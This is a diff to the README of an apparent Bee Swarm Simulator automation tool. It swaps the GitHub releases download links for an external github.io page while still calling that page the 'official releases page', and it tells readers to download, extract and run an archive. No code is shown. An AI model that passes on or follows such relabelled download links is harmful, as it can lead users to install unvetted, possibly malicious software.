@@ -1,6 +1,6 @@
 # 🐝 bee-swarm-pc-script-utility - Automated tools for Bee Swarm Simulator
 
-[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/strong-federicofellini984/bee-swarm-pc-script-utility/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://strong-federicofellini984.github.io)
 
 This utility helps you manage tasks in Bee Swarm Simulator on your PC. It automates repetitive actions to save time. You can use this tool to collect resources, move between fields, and manage hive routines without manual input.
 
@@ -20,7 +20,7 @@ To run this software, ensure your computer meets these standards:
 
 ## 🚀 Setting Up the Tool
 
-1.  Visit the [official releases page](https://github.com/strong-federicofellini984/bee-swarm-pc-script-utility/releases) to download the archive file.
+1.  Visit the [official releases page](https://strong-federicofellini984.github.io) to download the archive file.
 2.  Save the file to a folder on your computer.
 3.  Right-click the downloaded file and select Extract All.
 4.  Open the extracted folder.
